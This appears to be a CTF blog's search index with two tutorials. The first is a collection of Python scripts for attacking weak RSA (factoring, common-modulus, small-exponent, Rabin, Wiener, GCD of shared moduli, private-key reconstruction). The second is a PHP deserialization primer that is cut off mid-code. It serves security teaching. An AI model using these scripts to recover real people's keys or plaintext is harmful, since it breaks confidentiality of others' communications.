<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>RSA</title>
      <link href="/2018/03/30/crypto/ras/"/>
      <url>/2018/03/30/crypto/ras/</url>
      <content type="html"><![CDATA[<h2 id="模数相关攻击"><a href="#模数相关攻击" class="headerlink" title="模数相关攻击"></a>模数相关攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">openssl rsautl -decrypt -in hello.en -inkey test.key -out hello.de</span><br></pre></td></tr></table></figure><h3 id="暴力分解-N"><a href="#暴力分解-N" class="headerlink" title="暴力分解 N"></a>暴力分解 N</h3><h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>在 N 的比特位数小于 512 的时候，可以采用大整数分解的策略获取 p 和 q。</p><ul><li><a href="http://factordb.com/" target="_blank" rel="noopener">factordb</a></li><li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">yafu</a></li></ul><h3 id="p-amp-q-不当分解"><a href="#p-amp-q-不当分解" class="headerlink" title="p &amp; q 不当分解"></a>p &amp; q 不当分解</h3><h4 id="p-q-很大"><a href="#p-q-很大" class="headerlink" title="|p-q| 很大"></a>|p-q| 很大</h4><p>当 p-q 很大时，一定存在某一个参数较小，这里我们假设为 p，那么我们可以通过穷举的方法对模数进行试除，从而分解模数，得到保密参数与明文信息。基本来说，不怎么可行。</p><h4 id="p-q-较小"><a href="#p-q-较小" class="headerlink" title="|p-q| 较小"></a>|p-q| 较小</h4><p>顺序检查 √n 的每一个整数 x，直到找到一个 x 使得 x2−n 是平方数，记为 y2那么 x2−n=y2<br>，进而根据平方差公式即可分解 N</p><h4 id="p-1-光滑"><a href="#p-1-光滑" class="headerlink" title="p + 1 光滑"></a>p + 1 光滑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m primefac -vs -m=p+1 n</span><br></pre></td></tr></table></figure><h4 id="p-1-光滑-1"><a href="#p-1-光滑-1" class="headerlink" title="p - 1 光滑"></a>p - 1 光滑</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m primefac -vs n</span><br></pre></td></tr></table></figure><h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>当存在两个公钥的 N 不互素时，我们显然可以直接对这两个数求最大公因数，然后直接获得 p，q，进而获得相应的私钥。</p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031</span><br><span class="line">n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943</span><br><span class="line">print gmpy2.gcd(n1, n2)</span><br></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><h4 id="攻击条件-1"><a href="#攻击条件-1" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span><br><span class="line">e1 = 773</span><br><span class="line"></span><br><span class="line">e2 = 839</span><br><span class="line"></span><br><span class="line">message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line"></span><br><span class="line">message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br><span class="line"># s &amp; t</span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line">if s &lt; 0:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line">if t &lt; 0:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line">print plain</span><br></pre></td></tr></table></figure><h2 id="公钥指数相关攻击"><a href="#公钥指数相关攻击" class="headerlink" title="公钥指数相关攻击"></a>公钥指数相关攻击</h2><h3 id="小公钥指数攻击"><a href="#小公钥指数攻击" class="headerlink" title="小公钥指数攻击"></a>小公钥指数攻击</h3><h4 id="攻击条件-2"><a href="#攻击条件-2" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>e 特别小，比如 e 为 3。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/python</span><br><span class="line"># coding=utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line">pool = Pool(4)</span><br><span class="line"></span><br><span class="line">with open(&apos;./pubkey.pem&apos;, &apos;r&apos;) as f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">with open(&apos;flag.enc&apos;, &apos;r&apos;) as f:</span><br><span class="line">    cipher = f.read().encode(&apos;hex&apos;)</span><br><span class="line">    cipher = int(cipher, 16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def calc(j):</span><br><span class="line">    print j</span><br><span class="line">    a, b = gmpy2.iroot(cipher + j * N, 3)</span><br><span class="line">    if b == 1:</span><br><span class="line">        m = a</span><br><span class="line">        print &apos;&#123;:x&#125;&apos;.format(int(m)).decode(&apos;hex&apos;)</span><br><span class="line">        pool.terminate()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def SmallE():</span><br><span class="line">    inputs = range(0, 130000000)</span><br><span class="line">    pool.map(calc, inputs)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print &apos;start&apos;</span><br><span class="line">    SmallE()</span><br></pre></td></tr></table></figure><h3 id="RSA-衍生算法——Rabin-算法"><a href="#RSA-衍生算法——Rabin-算法" class="headerlink" title="RSA 衍生算法——Rabin 算法"></a>RSA 衍生算法——Rabin 算法</h3><h4 id="攻击条件-3"><a href="#攻击条件-3" class="headerlink" title="攻击条件"></a>攻击条件</h4><p>Rabin 算法的特征在于 e=2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># coding=utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">import string</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line"></span><br><span class="line"># 读取公钥参数</span><br><span class="line">with open(&apos;pubkey.pem&apos;, &apos;r&apos;) as f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e</span><br><span class="line">with open(&apos;flag.enc&apos;, &apos;r&apos;) as f:</span><br><span class="line">    cipher = f.read().encode(&apos;hex&apos;)</span><br><span class="line">    cipher = string.atoi(cipher, base=16)</span><br><span class="line">    # print cipher</span><br><span class="line">print &quot;please input p&quot;</span><br><span class="line">p = int(raw_input(), 10)</span><br><span class="line">print &apos;please input q&apos;</span><br><span class="line">q = int(raw_input(), 10)</span><br><span class="line"># 计算yp和yq</span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line"></span><br><span class="line"># 计算mp和mq</span><br><span class="line">mp = pow(cipher, (p + 1) / 4, p)</span><br><span class="line">mq = pow(cipher, (q + 1) / 4, q)</span><br><span class="line"></span><br><span class="line"># 计算a,b,c,d</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line">for i in (a, b, c, d):</span><br><span class="line">    s = &apos;%x&apos; % i</span><br><span class="line">    if len(s) % 2 != 0:</span><br><span class="line">        s = &apos;0&apos; + s</span><br><span class="line">    print s.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><h2 id="私钥-d-相关攻击"><a href="#私钥-d-相关攻击" class="headerlink" title="私钥 d 相关攻击"></a>私钥 d 相关攻击</h2><h3 id="d-泄露攻击"><a href="#d-泄露攻击" class="headerlink" title="d 泄露攻击"></a>d 泄露攻击</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>利用以下工具可以直接进行计算</p><ul><li><a href="https://sourceforge.net/projects/rsaconverter/" target="_blank" rel="noopener">RsaConverter.exe</a></li><li><a href="https://github.com/ius/rsatool" target="_blank" rel="noopener">rsatool.py</a></li></ul><h3 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h3><p>在 d 比较小时，攻击者可以使用 Wiener’s Attack 来获得私钥。</p><h4 id="识别："><a href="#识别：" class="headerlink" title="识别："></a>识别：</h4><p>非常简单，e看起来很大就行了。</p><h4 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h4><p><a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">rsa-wiener-attack</a></p><h2 id="计算-d"><a href="#计算-d" class="headerlink" title="计算 d"></a>计算 d</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 13574881</span><br><span class="line">q = 23781539</span><br><span class="line">n = p * q</span><br><span class="line">e = 23</span><br><span class="line">c = 0xdc2eeeb2782c</span><br><span class="line">phin = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line">p = gmpy2.powmod(c, d, n)</span><br><span class="line">tmp = hex(p)</span><br><span class="line">print tmp, tmp[2:].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 13574881</span><br><span class="line">q = 23781539</span><br><span class="line">n = p * q</span><br><span class="line">e = 23</span><br><span class="line">c = 0xdc2eeeb2782c</span><br><span class="line">phin = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line">p = gmpy2.powmod(c, d, n)</span><br><span class="line">tmp = hex(p)</span><br><span class="line">print tmp, tmp[2:].decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure><h2 id="生成私钥"><a href="#生成私钥" class="headerlink" title="生成私钥"></a>生成私钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    filename = &apos;private.pem&apos;</span><br><span class="line">    n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L</span><br><span class="line">    p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L</span><br><span class="line">    q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L</span><br><span class="line">    e = 65537L</span><br><span class="line">    priv = RSA.construct((n, e, long(gmpy2.invert(e, (p - 1) * (q - 1)))))</span><br><span class="line">    open(filename, &apos;w&apos;).write(priv.exportKey(&apos;PEM&apos;))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="公约数解密"><a href="#公约数解密" class="headerlink" title="公约数解密"></a>公约数解密</h2><h4 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP</span><br><span class="line">import gmpy2</span><br><span class="line">from base64 import b64decode</span><br><span class="line">n1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031</span><br><span class="line">n2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943</span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line">q1 = n1 / p1</span><br><span class="line">e = 65537</span><br><span class="line">phin = (p1 - 1) * (q1 - 1)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line">cipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7</span><br><span class="line">plain = gmpy2.powmod(cipher, d, n1)</span><br><span class="line">plain = hex(plain)[2:]</span><br><span class="line">if len(plain) % 2 != 0:</span><br><span class="line">    plain = &apos;0&apos; + plain</span><br><span class="line">print plain.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>反序列化</title>
      <link href="/2018/03/30/web/serialize/"/>
      <url>/2018/03/30/web/serialize/</url>
      <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul><li>serialize()将一个对象转换成一个字符串</li><li>unserialize()将字符串还原为一个对象<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">var</span> $b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b, $c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $a = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = $b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="string">'hello'</span>;</span><br><span class="line">$b = <span class="number">123</span>;</span><br><span class="line">$c = <span class="keyword">false</span>;</span><br><span class="line">$d = <span class="keyword">new</span> test(<span class="string">'helloa'</span>, <span class="string">'hellob'</span>, <span class="string">'helloc'</span>);</span><br><span class="line">$e = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">var_dump(serialize($b));</span><br><span class="line">var_dump(serialize($c));</span><br><span class="line">var_dump(serialize($d));</span><br><span class="line">var_dump(serialize($e));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string &apos;s:5:&quot;hello&quot;;&apos; (length=12)</span><br><span class="line">string &apos;i:123;&apos; (length=6)</span><br><span class="line">string &apos;b:0;&apos; (length=4)</span><br><span class="line">string &apos;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:6:&quot;hellob&quot;;&#125;&apos; (length=46)</span><br><span class="line">string &apos;O:5:&quot;test1&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;hello&quot;;s:1:&quot;b&quot;;N;&#125;&apos; (length=46)</span><br></pre></td></tr></table></figure><table><thead><tr><th>字母</th><th>类型</th></tr></thead><tbody><tr><td> a</td><td>array 数组</td></tr><tr><td> b</td><td>boolean布尔型</td></tr><tr><td> d</td><td>double双精度型</td></tr><tr><td> i</td><td>integer</td></tr><tr><td> o</td><td>common object一般对象</td></tr><tr><td> r</td><td>reference</td></tr><tr><td> s</td><td>string</td></tr><tr><td> C</td><td>custom object 自定义对象</td></tr><tr><td> O</td><td>class</td></tr><tr><td> N</td><td>null</td></tr><tr><td> R</td><td>pointer reference</td></tr><tr><td> U</td><td>unicode string unicode编码的字符串</td></tr></tbody></table><ul><li>序列化字符串格式：变量类型：变量长度：变量内容。</li><li>如果序列化的是一个对象，序列化字符串格式为：</li><li>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝<h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2></li><li>当序列化对象时，PHP 将在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用wakeup()成员函数。</li><li>在serialize()函数执行时，会先检查类中是否定义了sleep()函数，如果存在，则首先调用sleep()函数，如果不存在，就保留序列字符串中的所有属性。</li><li>在unserialize()函数执行时，会先检查是否定义了wakeup()函数。如果wakeup()存在，将执行__wakeup()函数，会使变量被重新赋值。<br>序列化中字母对应的类型</li></ul><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  class test&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    var $b;</span><br><span class="line">    function __construct($a,$b,$c)&#123;</span><br><span class="line">    $this-&gt;a  = $a;</span><br><span class="line">    $this-&gt;b = $b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function __sleep()&#123;</span><br><span class="line">    echo &quot;b has changed&quot;.&quot;\n&quot;;</span><br><span class="line">    $this-&gt;b = &apos;hib&apos;;</span><br><span class="line">    return $this-&gt;b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">    echo &quot;a has changed&quot;.&quot;\n&quot;;</span><br><span class="line">    $this-&gt;a = &apos;hia&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class test1 extends test&#123;</span><br><span class="line"></span><br><span class="line">     function __construct($a)&#123;</span><br><span class="line">     $this-&gt;a = $a;</span><br><span class="line">     &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    $d = new test(&apos;helloa&apos;,&apos;hellob&apos;,&apos;helloc&apos;);</span><br><span class="line">    $e = new test1(&apos;hello&apos;);</span><br><span class="line"></span><br><span class="line">    serialize($d);</span><br><span class="line">    serialize($e);</span><br><span class="line"></span><br><span class="line">    var_dump($d);</span><br><span class="line">    var_dump($e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b has changed b has changed</span><br><span class="line">object(test)[2]</span><br><span class="line">public &apos;a&apos; =&gt; string &apos;helloa&apos; (length=6)</span><br><span class="line">public &apos;b&apos; =&gt; string &apos;hib&apos; (length=3)</span><br><span class="line">object(test1)[2]</span><br><span class="line">public &apos;a&apos; =&gt; string &apos;hello&apos; (length=5)</span><br><span class="line">public &apos;b&apos; =&gt; string &apos;hib&apos; (length=3)</span><br></pre></td></tr></table></figure><h3 id="unserialize-测试代码"><a href="#unserialize-测试代码" class="headerlink" title="unserialize()测试代码"></a>unserialize()测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    var $a;</span><br><span class="line">    var $b;</span><br><span class="line">    function __construct($a, $b, $c)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = $a;</span><br><span class="line">        $this-&gt;b = $b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;b has changed&quot; . &quot;\n&quot;;</span><br><span class="line">        $this-&gt;b = &apos;hib&apos;;</span><br><span class="line">        return $this-&gt;b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;a has changed&quot; . &quot;\n&quot;;</span><br><span class="line">        $this-&gt;a = &apos;hia&apos;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class test1 extends test</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    function __construct($a)</span><br><span class="line">    